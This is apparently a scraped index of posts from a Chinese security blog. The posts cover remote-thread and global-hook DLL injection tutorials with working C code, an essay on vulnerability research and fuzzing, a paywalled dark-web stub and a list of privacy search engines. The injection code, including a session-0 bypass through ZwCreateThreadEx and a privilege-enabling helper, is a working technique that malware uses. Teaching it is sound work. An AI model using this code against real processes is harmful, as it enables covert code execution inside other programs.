OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId); if (NULL == hProcess) { printf(\"Error OpenProcess,%d\", GetLastError()); return FALSE; } // 在注入进程中申请内存 dwSize = 1 + lstrlen(pszDllFileName); pDllAddr = VirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT, PAGE_READWRITE); if (pDllAddr == NULL) { printf(\"Error VirtualAllocEx,%d\", GetLastError()); return FALSE; } // 向申请的内存中写入数据 if (FALSE == WriteProcessMemory(hProcess, pDllAddr, pszDllFileName, dwSize, NULL)) { printf(\"Error WriteProcessMemory,%d\", GetLastError()); return FALSE; } // 获取LoadLibraryA函数地址 pFuncProcAddr = GetProcAddress(GetModuleHandle(L\"kernel32.dll\"), \"LoadLibraryA\"); if (NULL == pFuncProcAddr) { printf(\"Error GetProcAddress,%d\", GetLastError()); return FALSE; } // CreateRemoteThreadc创建远程线程，实现dll注入 HANDLE hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pFuncProcAddr, pDllAddr, 0, NULL); if (NULL == hRemoteThread) { printf(\"Error CreateRemoteThread,%d\", GetLastError()); return FALSE; } CloseHandle(hProcess); return TRUE; } int main() { wchar_t* dllPath = (wchar_t*)\"D:\\\\Dll1.dll\"; CreateRemoteThreadInjectDll(9956, dllPath); return 0; } DLL代码： 该DLL项目由vs2019生成，注入后自动弹出消息框 // dllmain.cpp : 定义 DLL 应用程序的入口点。 #include \"pch.h\" BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved ) { switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH:{ MessageBoxA(NULL, \"Inject is OK!\", \"OK\", MB_OK); break; } case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; } return TRUE; } ","date":"2021-11-30","objectID":"/zh-cn/31-11/:0:4","tags":["DLL注入","远线程注入"],"title":"技术分享 | DLL注入之远线程注入","uri":"/zh-cn/31-11/"},{"categories":["DLL注入","远线程注入"],"content":"0x04 突破session0隔离的远线程注入 这里使用到一个函数ZwCreateThreadEx，实际上CreateRemoteThread最终是通过调用ZwCreateThreadEx实现远线程创建的，ZwCreateThreadEx更为底层。在内核6.0（Windows VISTA、7、8）之后，由于session隔离机制，在创建进程之后是先挂起进程，检查进程所在的会话层后再决定是否恢复进程。 在CreateRemoteThread函数调用ZwCreateThreadEx函数时，由于ZwCreateThreadEx第七个参数为1，会导致线程创建后一直处于挂起状态，因此我们需要设置ZwCreateThreadEx第七个参数为0。 由于在ntdll.dll中，ZwCreateThreadEx并没有被声明，因此需要使用GetProcAddress导出地址 函数声明： win64下： DWORD WINAPI ZwCreateThreadEx( PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, LPVOID ObjectAttributes, HANDLE ProcessHandle, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, ULONG CreateThreadFlags, SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, LPVOID pUnkown ) win32下: DWORD WINAPI ZwCreateThreadEx( PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, LPVOID ObjectAttributes, HANDLE ProcessHandle, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, BOOL CreateSuspended, DWORD dwStackSize, DWORD dw1, DWORD dw2, LPVOID pUnkown ) 实例代码： #include \"Windows.h\" #include \u003cstdio.h\u003e BOOL ZwCreateThreadExInjectDLL(DWORD dwProcessId, const char* pszDllFileName) { HANDLE hProcess = NULL; SIZE_T dwSize = 0; LPVOID pDllAddr = NULL; FARPROC pFuncProcAddr = NULL; HANDLE hRemoteThread = NULL; DWORD dwStatus = 0; // 打开进程 hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId); if (NULL == hProcess) { printf(\"Error OpenProcess:%d\", GetLastError()); return FALSE; } // 申请内存 dwSize = 1 + ::lstrlen(pszDllFileName); pDllAddr = VirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT, PAGE_READWRITE); if (pDllAddr == NULL){ printf(\"Error VirtualAllocEx:%d\", GetLastError()); return FALSE; } // 写入数据 if (FALSE == WriteProcessMemory(hProcess, pDllAddr, pszDllFileName, dwSize, NULL)) { printf(\"Error WriteProcessMemory:%d\", GetLastError()); return FALSE; } #ifdef _WIN64 typedef DWORD(WINAPI* typedef_ZwCreateThreadEx)( PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, LPVOID ObjectAttributes, HANDLE ProcessHandle, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, ULONG CreateThreadFlags, SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, LPVOID pUnkown); #else typedef DWORD(WINAPI* typedef_ZwCreateThreadEx)( PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, LPVOID ObjectAttributes, HANDLE ProcessHandle, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, BOOL CreateSuspended, DWORD dwStackSize, DWORD dw1, DWORD dw2, LPVOID pUnkown); #endif // 加载ntdll.dll HMODULE hNtdllDll = LoadLibrary(\"ntdll.dll\"); if (NULL == hNtdllDll) { printf(\"Error Load 'ntdll.dll':%d\", GetLastError()); return FALSE; } // 获取LoadLibraryA函数地址 pFuncProcAddr = GetProcAddress(::GetModuleHandle(\"kernel32.dll\"), \"LoadLibraryA\"); if (NULL == pFuncProcAddr) { printf(\"Error GetProcAddress 'LoadLibraryW':%d\", GetLastError()); return FALSE; } // 获取ZwCreateThreadEx函数地址 typedef_ZwCreateThreadEx ZwCreateThreadEx = (typedef_ZwCreateThreadEx)GetProcAddress(hNtdllDll, \"ZwCreateThreadEx\"); if (NULL == ZwCreateThreadEx) { printf(\"Error GetProcAddress 'ZwCreateThreadEx':%d\", GetLastError()); return FALSE; } // 使用ZwCreateThreadEx创建远线程，实现DLL注入 dwStatus = ZwCreateThreadEx(\u0026hRemoteThread, PROCESS_ALL_ACCESS, NULL, hProcess, (LPTHREAD_START_ROUTINE)pFuncProcAddr, pDllAddr, 0, 0, 0, 0, NULL); if (NULL == hRemoteThread) { printf(\"Error Inject DLL:%u\", dwStatus); return FALSE; } CloseHandle(hProcess); FreeLibrary(hNtdllDll); return TRUE; } // OpenProcess打开高权限的进程需要提权 BOOL EnbalePrivileges(HANDLE hProcess, const char* pszPrivilegesName) { HANDLE hToken = NULL; LUID luidValue = { 0 }; TOKEN_PRIVILEGES tokenPrivileges = { 0 }; BOOL bRet = FALSE; DWORD dwRet = 0; // 打开进程令牌并获取进程令牌句柄 bRet = ::OpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES, \u0026hToken); if (FALSE == bRet) { printf(\"OpenProcessToken\"); return FALSE; } // 获取本地系统的 pszPrivilegesName 特权的LUID值 bRet = ::LookupPrivilegeValue(NULL, pszPrivilegesName, \u0026luidValue); if (FALSE == bRet){ printf(\"LookupPrivilegeValue\"); return FALSE; } // 设置提升权限信息 tokenPrivileges.PrivilegeCount = 1; tokenPrivileges.Privileges[0].Luid = luidValue; ","date":"2021-11-30","objectID":"/zh-cn/31-11/:0:5","tags":["DLL注入","远线程注入"],"title":"技术分享 | DLL注入之远线程注入","uri":"/zh-cn/31-11/"},{"categories":["DLL注入","远线程注入"],"content":"0x05 踩坑记录 1、如果注入到x64程序，最好exe、dll都编译成x64 2、注入dll需要与注入进程的字符集相同，vs2019可以在项目属性-\u003e高级处选择字符集（被这里坑了好久，普通session层可以注入，session0注入不了，查了好久，最后一个大佬说字符集要相同，后面将dll、exe字符集改成多字符集注入成功了) ","date":"2021-11-30","objectID":"/zh-cn/31-11/:0:6","tags":["DLL注入","远线程注入"],"title":"技术分享 | DLL注入之远线程注入","uri":"/zh-cn/31-11/"},{"categories":["DLL注入","钩子注入"],"content":"此文为加密收费内容添加我微信支付后可看: DLL注入之全局钩子注入 ","date":"2021-11-30","objectID":"/zh-cn/31/:0:0","tags":["DLL注入","钩子注入"],"title":"DLL注入之全局钩子注入","uri":"/zh-cn/31/"},{"categories":["DLL注入","钩子注入"],"content":"0x00 HOOK概述 Hook也就是钩子，在Windows中大部分的应用程序都是基于消息机制，会根据不同的消息使用消息过程函数完成不同的功能。而钩子是一种消息处理机制，它可以比你的应用程序先获得消息，可以用来截获、监视系统的消息，改变执行流程实现特定的功能。对于全局钩子来说，它会影响所有应用程序，所以钩子函数必须在DLL中实现。 ","date":"2021-11-30","objectID":"/zh-cn/31/:0:1","tags":["DLL注入","钩子注入"],"title":"DLL注入之全局钩子注入","uri":"/zh-cn/31/"},{"categories":["DLL注入","钩子注入"],"content":"0x01 函数介绍 SetWindowsHookEx 作用： 将程序定义的钩子函数安装到挂钩链中，安装钩子的程序可以监视系统是否存在某些类型的时间，这些事件与特定线程或调用线程所在的桌面中的所有线程相关联。 **函数声明： ** ActionScript HHOOK WINAPI SetWindowsHookEx（ _In_ int idHook, _In_ HOOKPROC lpfn, _In_ HINSTANCE hMod, _In_ DWORD dwThreadId） 参数： idHook: 安装的钩子程序的类型，具体值参考官方手册 lpfn： 指向钩子程序过程的指针，若参数dwThreadId为0或者指示了一个其他进程创建的线程之标识符，则参数lpfn必须指向一个动态链接中的挂钩处理过程。否则，参数lpfn可以指向一个与当前进程相关的代码中定义的挂钩处理过程。 hMod： 包含由lpfn参数指向的钩子过程的DLL句柄。 dwThreadId： 与钩子程序关联的线程标识符，如果为0，则钩子过程与系统中所有线程相关联。 ** ** 返回值： 成功：返回钩子过程句柄 失败：返回NULL *UnhookWindowsHookEx* * * 作用： 卸载钩子 函数声明： ActionScript BOOL WINAPI UnsetGlobalHook（ _In_ HHOOK hhk） 参数： hhk: 卸载的钩子句柄 ","date":"2021-11-30","objectID":"/zh-cn/31/:0:2","tags":["DLL注入","钩子注入"],"title":"DLL注入之全局钩子注入","uri":"/zh-cn/31/"},{"categories":["DLL注入","钩子注入"],"content":"0x02 实例代码 使用IDE：VS2019 创建一个DLL项目 pch.h: ActionScript #include \"framework.h\" extern \"C\" _declspec(dllexport) int SetGlobalHook(); extern \"C\" _declspec(dllexport) LRESULT GetMsgProc(int code, WPARAM wParam, LPARAM lParam); extern \"C\" _declspec(dllexport) BOOL UnsetGlobalHook(); #endif //PCH_H ​ ​ dllmain.cpp ActionScript // dllmain.cpp : 定义 DLL 应用程序的入口点。 #include \"pch.h\" HMODULE g_hDllModule = NULL; BOOL APIENTRY DllMain( HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved ) { switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH: { g_hDllModule = hModule; break; } case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; } return TRUE; } `` 钩子过程： SetGlobalHook(): 设置全局钩子，WH_GETMESSAGE为监视发送到消息队列的消息的钩子，第二个参数则为钩子的回调函数。 GetMsgProc()： 钩子的回调函数，CallNextHookEx表示将当前钩子传递给下一个钩子，若返回值为0，表示中断钩子传递，对钩子进行拦截。 UnsetGlobalHook()： 卸载钩子 共享内存： 由于全局钩子是以DLL形式加载到进程中，进程都是独立的，要将进程句柄传递给其他进程，可以使用共享内存突破进程独立性，使用\"/SECTION:mydata,RWS\"设置为可读可写可共享的数据段。 ​ pch.cpp: ActionScript #include \"pch.h\" #include \u003cwindows.h\u003e #include \u003cstdio.h\u003e extern HMODULE g_hDllModule; // 共享内存 #pragma data_seg(\"mydata\") HHOOK g_hHook = NULL; #pragma data_seg() #pragma comment(linker, \"/SECTION:mydata,RWS\") //钩子回调函数 LRESULT GetMsgProc(int code, WPARAM wParam, LPARAM lParam){ return ::CallNextHookEx(g_hHook, code, wParam, lParam); } // 设置钩子 BOOL SetGlobalHook() { g_hHook = SetWindowsHookEx(WH_GETMESSAGE, (HOOKPROC)GetMsgProc, g_hDllModule, 0); if (NULL == g_hHook) { return FALSE; } return TRUE; } // 卸载钩子 BOOL UnsetGlobalHook() { if (g_hHook) { UnhookWindowsHookEx(g_hHook); } return TRUE; } 最终生成Dll1.dll 创建c++空项目 编译下面代码，将Dll1.dll放在生成的exe下，运行 ​ hook.cpp: #include \u003cwindows.h\u003e #include \u003cstdio.h\u003e typedef BOOL(*PEN_HOOKSTART)(); typedef BOOL(*PEN_HOOKSTOP)(); int main() { //加载dll HMODULE hDll = LoadLibrary(L\"./Dll1.dll\"); if (NULL == hDll) { printf(\"LoadLibrary Error[%d]\\n\", ::GetLastError()); return 1; } BOOL isHook = FALSE; //导出函数地址 PEN_HOOKSTART SetGlobalHook = (PEN_HOOKSTART)GetProcAddress(hDll, \"SetGlobalHook\"); if (NULL == SetGlobalHook) { printf(\"SetGlobalHook:GetProcAddress Error[%d]\\n\", GetLastError()); return 2; } PEN_HOOKSTOP UnsetGlobalHook = (PEN_HOOKSTOP)GetProcAddress(hDll, \"UnsetGlobalHook\"); if (NULL == UnsetGlobalHook) { printf(\"UnsetGlobalHook:GetProcAddress Error[%d]\\n\", GetLastError()); return 3; } isHook=SetGlobalHook(); if (isHook) { printf(\"Hook is ok!\\n\"); } else { printf(\"Hook is error[%d]\\n\", GetLastError()); } system(\"pause\"); UnsetGlobalHook(); FreeLibrary(hDll); return 0; } ","date":"2021-11-30","objectID":"/zh-cn/31/:0:3","tags":["DLL注入","钩子注入"],"title":"DLL注入之全局钩子注入","uri":"/zh-cn/31/"},{"categories":["DLL注入","钩子注入"],"content":"0x03 查看效果 使用Process Explorer查看dll： 可以看到已经注入了Dll1.dll ","date":"2021-11-30","objectID":"/zh-cn/31/:0:4","tags":["DLL注入","钩子注入"],"title":"DLL注入之全局钩子注入","uri":"/zh-cn/31/"},{"categories":[],"content":" $(document).ready(function() {$(\"#begin_speak\").click(function () { let content = $(\"#text\").text(); let msg = new SpeechSynthesisUtterance(content); window.speechSynthesis.speak(msg);$(\"#pause_speak\").show();$(\"#cancel_speak\").show();});$(\"#cancel_speak\").click(function () { window.speechSynthesis.cancel();$(\"#pause_speak\").hide();$(\"#resume_speak\").hide();$(this).hide(); });$(\"#pause_speak\").click(function () { window.speechSynthesis.pause();$(\"#resume_speak\").show(); });$(\"#resume_speak\").click(function () { window.speechSynthesis.resume();$(this).hide(); }); }); 聊聊漏洞分析、漏洞利用和漏洞挖掘。 前言 说到安全就不能不说漏洞，而说到漏洞就不可避免地会说到三座大山： 漏洞分析 漏洞利用 漏洞挖掘 从笔者个人的感觉上来看，这三者尽管通常水乳交融、相互依赖，但难度是不尽相同的。本文就这三者分别谈谈自己的经验和想法。 漏洞分析 漏洞分析相对简单，通常公开的漏洞中就有一两句话描述了漏洞的成因，自己拉代码下来看也就能了解个大概。对于一些自己发现的bug，从崩溃日志中一般也能比较轻松地进行复现和调试。尽管有的bug排查起来相对繁琐，但总归是可以一步步减少范围锁定最终目标的。因此，网上对于漏洞分析的文章很多，一方面分析起来有迹可循，另一方面分析的漏洞也不一定是自己的“原创”漏洞，素材来源更加广泛。 漏洞分析虽然简单，却是每个安全研究人员的必经之路。就像练武中的扎马步、站梅花桩一样，是日积月累的基本功。之前研究内核时有段时间热衷于写漏洞分析的文章，后来随着日渐熟练，写文章记录的速度已经远远跟不上分析的进度，所以现在往往懒得动笔了。 基本功必不可少，但扎马步扎得再稳也不表示你能独步武林。有大佬曾经说过，如果他想的话，可以一天写好几篇分析文章还不带重样的。毕竟，漏洞分析的目的是为了学习、吸收、转化，以史为鉴，最终形成自己独到的理解。 漏洞利用 漏洞利用就相对复杂一点，尤其是对于二进制漏洞，成功的利用需要精巧的内存布局，因此需要对程序涉及到的数据结构要相当的了解。而且并不是所有漏洞都能转换为有效利用的，一般比较容易编写利用的漏洞，我们称之为品相好。对于品相不好的漏洞，我更喜欢将其称之为bug。当然也有人认为 bug 至少造成了程序崩溃，所以可以算一个DoS(拒绝服务)漏洞。 当然漏洞能否利用其实也是和人有关。对于复杂的系统，你认为无法利用的漏洞，大佬就能以一种你没想到的方式利用成功。比如安卓CVE-2019-2025(水滴)漏洞，属于Binder中的一个条件竞争，竞争窗口只有几条汇编指令。漏洞品相相当不好，连CVSS给出的可利用分数(Exploitability Score)也只有1.8分，但360的大佬们也通过玩弄调度器进行稳定利用提权了。 因此，关于漏洞利用的文章也就少了很多。一方面处于负责任披露安全问题的考虑，安全研究人员不会给出完整的利用细节，以免脚本小子滥用；另一方面对于公开的利用，你也总不能跟着写一篇文章灌水，毕竟利用思路很多时候是因人而异的，过于雷同就难免有炒冷饭的嫌疑，除非有一些独到的思考补充，或者有新的利用思路。 很多时候漏洞利用的文章看着看着就变成了漏洞利用分析的文章，这也说明了漏洞利用难度颇高，能独立写出原创利用并进行分享的人不多。就我的感觉而言，漏洞利用更像是另一种形式的软件开发，首先通过漏洞构造原语，然后通过原语实现最终的利用程序。 漏洞挖掘 漏洞挖掘可以说是安全研究人员向往的高地之一，不管你分析了多少漏洞，写了多少利用，如果你没有自己挖掘出过原创的漏洞，那你的安全研究生涯就是不完整的。但是漏洞挖掘这事儿并不是确定性的。漏洞分析只要有漏洞肯定能分析清楚，只不过是时间问题；漏洞利用只要不是明显的无法利用，那至少也存在利用成功的可能性。 漏洞挖掘则不然，即便你盯着某个应用使劲挖，也不能保证有结果，说不定对方根本就没有能触发的漏洞。都说世上没有绝对安全的系统，但是相对安全的系统一抓一大把，至少在出问题之前，你是不知道的。 我们能看到各种安全会议中介绍各种新发现的漏洞和问题，网上也有很多相关的文章，但更多是炫技式分享(show-off)，很少有分享怎么挖洞的。因此笔者就先抛砖引玉，谈谈自己的想法。 ","date":"2021-11-29","objectID":"/zh-cn/audio/:0:0","tags":[],"title":"漫谈漏洞挖掘","uri":"/zh-cn/audio/"},{"categories":[],"content":"Fuzzing 自从 AFL 横空出世之后，当今漏洞挖掘言必称 Fuzzing，仿佛这是李云龙他娘的意大利炮，不管三七二十一先来上一发就能轰出几个 0day。当然，我不是说 Fuzz 不好，只不过凡事都有其诞生和得以应用的环境。 Fuzzing 即模糊测试，在早期是 QA 测试中的一项黑盒测试技术，通过随机变异的输入来测试程序的鲁棒性。在程序的崩溃被用于漏洞利用后，也就一跃成为一种漏洞挖掘方法。随机变异输入的效率相对低下，可能变异了半天连 main 函数里第一个 if 都没有跳进去。AFL 率先提出并实现了根据路径/覆盖率等反馈来进行输入的变异，从而大大提升了测试用例的有效性。 自从 2013 年 AFL 提出以来，各类 Fuzzer 百花齐放，在学术上有了爆发性的论文增长；开源社区有 honggfuzz、libFuzzer 等优秀的项目；在工程上有 OSS-Fuzz 利用庞大机器集群进行持续测试的应用和 syzkaller 这种年均发现几千内核漏洞的工具等。 从产出的漏洞数量来看，Fuzzing 作为一种漏洞挖掘方法可谓一骑绝尘。当时，随着时间的推移，通用模糊测试策略已经越来越难发现新的漏洞，要么你有独特的测试语料，要么你有领先的运算资源。因此，一部分人就从通用 Fuzzer 转回到了针对特定目标变异的 Fuzzer(即 Structure Aware Fuzzer)。也就是说，只针对目标程序接受的数据类型进行特定变异，比如针对 PDF 文件格式每个字段变异等等。 别忘了，AFL 这种通用 Fuzzer 的出现，就是为了实现一次编码，到处 Fuzz 的目的；而针对不同目标去写 Fuzzer，显然有违初衷。另外，如果目标接受的是已知格式的输入还好，对于未知格式，还需要自己去分析和理解各个字段含义。在阅读代码和理解代码逻辑的过程中，目标程序的潜在问题很可能已经出现在你眼前了，再去编写一个不能复用的 Fuzzer，显得有些多此一举。这种发现漏洞的方法也就是下节所说的——代码审计。 ","date":"2021-11-29","objectID":"/zh-cn/audio/:1:0","tags":[],"title":"漫谈漏洞挖掘","uri":"/zh-cn/audio/"},{"categories":[],"content":"代码审计 代码审计，俗称看代码。有的人用 SourceInsight 看，有的人用 VIM 看，但不管怎么样还是用眼睛看。既然大家都长了两只眼睛，为什么有的人就能一个月看出十几个高危，有的人就只看了个寂寞？ 看代码也是有方法的。虽然我比较想听听 @oldfresher 是怎么看代码的，但他似乎不太愿意分享，所以我只能说说自己的方法。 要挖漏洞首先要对漏洞进行分类，大致可以分为下面三种: 设计漏洞 实现漏洞 操作漏洞 所谓设计漏洞就是软件设计过程中就存在逻辑问题，比如 WiFi 的 WEP，设计的问题往往是比较严重的，而且修复周期长，所幸这类问题不是太多；实现漏洞就是我们常见的软件漏洞，内存溢出、UAF、条件竞争等都算在里面；操作漏洞和实现漏洞往往类似，只不过更多是指配置错误而产生的漏洞，比如 nginx 配置错误导致的目录穿越问题就属于一种操作漏洞。 明确漏洞类型后也不是马上开始看代码，而是先进行初步的攻击面分析，也就是常说的威胁建模。主要分为下面几步: 信息收集: 收集所有相关的资料，尤其是设计文档或者帮助手册等 应用架构建模: 列举应用所含的组件以及状态机，注意各个组件之间隐含的信任关系 威胁鉴定: 在各个流程中列举潜在的攻击点，并分别标记危害等级 审计计划: 按优先级对实现的审计计划进行排序 代码审计听起来是个让人退缩任务，因为你面对的是一堆你不熟悉的代码，而且要求你快速地建立起自己的理解而且找到其中最深层的秘密(安全漏洞)。通常你不会有足够的时间审计项目的每一行代码，因此这其中的一个重点就是懂得如何分配精力，在最可能出现安全问题的代码中达到满意的审计覆盖率。 成功的代码审计过程一定是务实、灵活且面向结果的。虽然讲究方法，但并不意味着根据别人的方法就能成功。与很多人的认知不同，代码审计其实是一件需要创造力的技能。那位说了，看别人代码要什么创造力？要在应用中找到漏洞，审计者需要将自己代入作者的思维中理解代码，同时还需要跳出作者的思维，洞察到原作者没有预料到的可能性；这种技能与知识相对，像是骑车、游泳、弹琴一样，是需要通过学习和练习去掌握的，而一旦掌握就像本能的一部分难以忘记。当然代码审计也有知识的部分，比如需要了解各种漏洞类型和场景等。 这些都这只是代码审计中的冰山一角，篇幅原因无法面面俱到。比如代码审计策略的抉择，是深度优先还是广度优先(看到某个函数调用是否需要追进去看)；以及使用现代的静态分析工具来辅助审计，比如 Fority、CodeQL 等，后续有时间再单独进行介绍吧。 后记 漏洞分析是技术，漏洞利用是艺术，漏洞挖掘是法术。关于漏洞利用和漏洞挖掘哪个“技术含量”更高，还存在一定争议，但漏洞分析的基础地位毫无疑问。技术可以学，艺术可以练，法术呢？其实同样也可以通过练习提高自己的 漏洞挖掘水平。推荐一个忘了是什么地方的议题中提供的方法(也许是 CCC): 找到公开的漏洞通告，根据标题的内容自己去相关模块中审计看是否能发现该漏洞 如果发现不了，就回头接着看漏洞通告的细节，反思自己的审计方法 不断重复，直到让自己可以认为找漏洞只是时间问题而不是能力问题 任何行业都没有捷径，你看到的所谓魔法，很可能只是某人在某些事情上付出了你意想不到的时间。最后借用一句谚语作为结尾吧: Ever tried. Ever failed. No matter. Try again. Fail again. Fail better. 共勉。 ","date":"2021-11-29","objectID":"/zh-cn/audio/:2:0","tags":[],"title":"漫谈漏洞挖掘","uri":"/zh-cn/audio/"},{"categories":["DarkWeb"],"content":"此文为加密收费内容添加我微信支付后可看: ","date":"2021-11-29","objectID":"/zh-cn/30-3/:0:0","tags":["DarkWeb"],"title":"简单几步带你走进【暗网】","uri":"/zh-cn/30-3/"},{"categories":["DarkWeb"],"content":"暗网是什么？ 黑暗网站（英语：Dark web）多简称为暗网，是存在于黑暗网络、覆盖网络上的万维网内容，只能用特殊软件、特殊授权、或对电脑做特殊设置才能访问。暗网是由深网的一小部分所构成的。而深网的网络不能够被正常网络搜索引擎（如谷歌、雅虎等）索引，有时“深网”这一术语经常被错误地用于指代暗网。构成暗网的隐藏服务网络包括F2F的小型点对点网络以及由公共组织和个人运营的大型流行网络，如Tor、自由网、I2P和Riffle。暗网用户基于常规网络未加密的性质将其称为明网。Tor暗网可以称为洋葱区域（onionland），其使用网络顶级域后缀.onion和洋葱路由的流量匿名化技术。 ​ 以上来源于维基百科 软件下载 这里需要借助洋葱浏览器，需要科学上网才能正常下载，这里小编已经下载下来放到了网盘里面了，需要的朋友可以自己下载，也可以点击下面链接下载。 阿里网盘下载 ","date":"2021-11-29","objectID":"/zh-cn/30-3/:1:0","tags":["DarkWeb"],"title":"简单几步带你走进【暗网】","uri":"/zh-cn/30-3/"},{"categories":["搜索引擎"],"content":"搜索引擎列表 搜索引擎已经成为我们上网活动中必不可少的一部分，像大家熟知的国外的Google，中国的百度，这些都已经成为人们从网上获取信息的重要工具。很多人苦于百度的广告，但是又对国内无法使用Google搜索而感到无奈（科学上网有一定的门槛，所以只有少部分人才会的）。搜索引擎发展至今，到现在搜索引擎市场也诞生了不少的“优秀分子”，下面我将对这些搜索引擎进行盘点。 提示：下面的搜索引擎盘点中并不会包含百度等其他的一些国内的乱七八糟的搜索引擎，国内百度并不是说不能用，只是觉得我要的信息是要在广告里面找出来的，这很耽误时间。其他的像360搜索之类的搜索服务做的还不如百度，也就没有列举的必要了。 ","date":"2021-11-29","objectID":"/zh-cn/30-2/:0:0","tags":["搜索引擎"],"title":"搜索引擎列表","uri":"/zh-cn/30-2/"},{"categories":["搜索引擎"],"content":"Magi Magi 是由 Peak Labs研发的基于机器学习的信息抽取和检索系统，它能将任何领域的自然语言文本中的知识提取成结构化的数据，通过终身学习持续聚合和纠错，进而为人类用户和其他人工智能提供可解析、可检索、可溯源的知识体系。 总而言之一句话，基于机器学习的搜索引擎。提供结果的同时还会列举出自己的学习来源。在国内来说值得一试。 ","date":"2021-11-29","objectID":"/zh-cn/30-2/:1:0","tags":["搜索引擎"],"title":"搜索引擎列表","uri":"/zh-cn/30-2/"},{"categories":["搜索引擎"],"content":"bing 国内版/大陆国际版：https://cn.bing.com 原生bing：https://www.bing.com 相信你已经看出来了，是的，bing虽说有三个版本，但是上面两个版本是大陆的定制版，搜索页面下方是有公安备案的，海外原生bing是没有备案的，这是两者外观上很显著的差别。当大陆地区使用bing的时候，就会被强制重定向到cn.bing.com——也就是国内定制版bing。但是，虽说是大陆定制版，搜索的效率和结果比百度逊色不了多少，而且结果中广告更少。在国内不失为一个好用的搜索引擎。 关于两者的域名问题可以查阅这里 两者之间的区别则可以查阅这里 注意：下面的搜索引擎大多数国内都无法访问，如果点击链接没有打开页面，那就证明已经被GFW拦截了。 ","date":"2021-11-29","objectID":"/zh-cn/30-2/:2:0","tags":["搜索引擎"],"title":"搜索引擎列表","uri":"/zh-cn/30-2/"},{"categories":["搜索引擎"],"content":"Google 海外使用人数最大的搜索引擎，搜索引擎界的老大哥。搜索效率高，广告少，准确率高。但是国内大陆地区无法访问和使用。但是会追踪用户，分析用户行为，收集用户信息用于投放广告。 ","date":"2021-11-29","objectID":"/zh-cn/30-2/:3:0","tags":["搜索引擎"],"title":"搜索引擎列表","uri":"/zh-cn/30-2/"},{"categories":["搜索引擎"],"content":"DuckDuckgo 注重用户隐私，及避免个性化检索所致的过滤气泡，它与其他搜索引擎不同的地方在于其不会分析自己的用户、对所有使用同一组关键词的用户显示同样的结果。它也强调返回最佳结果，而不是最多网站链接的结果。之前国内的多吉搜索也是这般倡导不打扰，不追踪，但是在今年两会期间就凉了，类似的还有秘迹搜索。 ","date":"2021-11-29","objectID":"/zh-cn/30-2/:4:0","tags":["搜索引擎"],"title":"搜索引擎列表","uri":"/zh-cn/30-2/"},{"categories":["搜索引擎"],"content":"Startpage Startpage为一荷兰公司Startpage B.V.所推出的搜寻引擎服务,Startpage后台使用Google搜索API，所以具有跟Google本身相同的搜索质量。但是它发给Google服务器的只有搜索关键字，Google不会获取到除此以外的头字段和cookie等信息。因此，startpage在用户隐私保护方面同样出色。 ","date":"2021-11-29","objectID":"/zh-cn/30-2/:5:0","tags":["搜索引擎"],"title":"搜索引擎列表","uri":"/zh-cn/30-2/"},{"categories":["搜索引擎"],"content":"Qwant Qwant是由法国打造专业搜索引擎的法国企业Pertimm和信息安全专家ÉricLeandri合作创建的一个搜索引擎，以15种语言面向35个国家开放。Qwant执行非常严格的隐私条例，保证绝不获取使用者的任何信息，也不会在用户浏览网站时，搭载任何可能泄露使用者身份及位置的Cookies（小型文本）文件。 ","date":"2021-11-29","objectID":"/zh-cn/30-2/:6:0","tags":["搜索引擎"],"title":"搜索引擎列表","uri":"/zh-cn/30-2/"},{"categories":["搜索引擎"],"content":"Ecosia Ecosia是一个总部位于德国柏林的搜索引擎，他们将至少80%的利润捐赠给非营利利组织，用于种植树木。Ecosia致力于保护用户隐私。搜索会被加密，不会永久存储，Ecosia也不会将数据出售给第三方广告商。Ecosia在隐私政策中声明，它不创建基于搜索历史记录的个人配置文件，也不使用任何诸如Google分析的外部跟踪工具。截止2020年7月，Ecosia种植的树木总数已超过1亿株，每月从大气中吸收超过5万吨的二氧化碳。 ","date":"2021-11-29","objectID":"/zh-cn/30-2/:7:0","tags":["搜索引擎"],"title":"搜索引擎列表","uri":"/zh-cn/30-2/"},{"categories":["搜索引擎"],"content":"Metager MetaGer是基于德国的基于隐私的搜索引擎。与“startpage”一样，MetaGer也使用代理服务器技术在访问网站时隐藏用户的位置。在MetaGer上搜索字词时，用户会在每个结果下方看到一个名为“匿名打开”的附加选项。”单击后，MetaGer将设置代理服务器并通过它定向到你想要的网站。因为MetaGer是查询的来源，所以用户的访问仍然是匿名的,同时MetaGer是以捐赠为支持的非营利组织。 ","date":"2021-11-29","objectID":"/zh-cn/30-2/:8:0","tags":["搜索引擎"],"title":"搜索引擎列表","uri":"/zh-cn/30-2/"},{"categories":["搜索引擎"],"content":"peeker Peeker 是一种搜索网页的新方法。 在尊重你隐私的搜索引擎上快速安全地查看搜索结果。与一般搜索引擎不同的是，peeker采用宫格图方式展现搜索结果，这样的方式有利于用户预览网页内容。同时也是具有严格的隐私政策。 ","date":"2021-11-29","objectID":"/zh-cn/30-2/:9:0","tags":["搜索引擎"],"title":"搜索引擎列表","uri":"/zh-cn/30-2/"},{"categories":["搜索引擎"],"content":"Searx 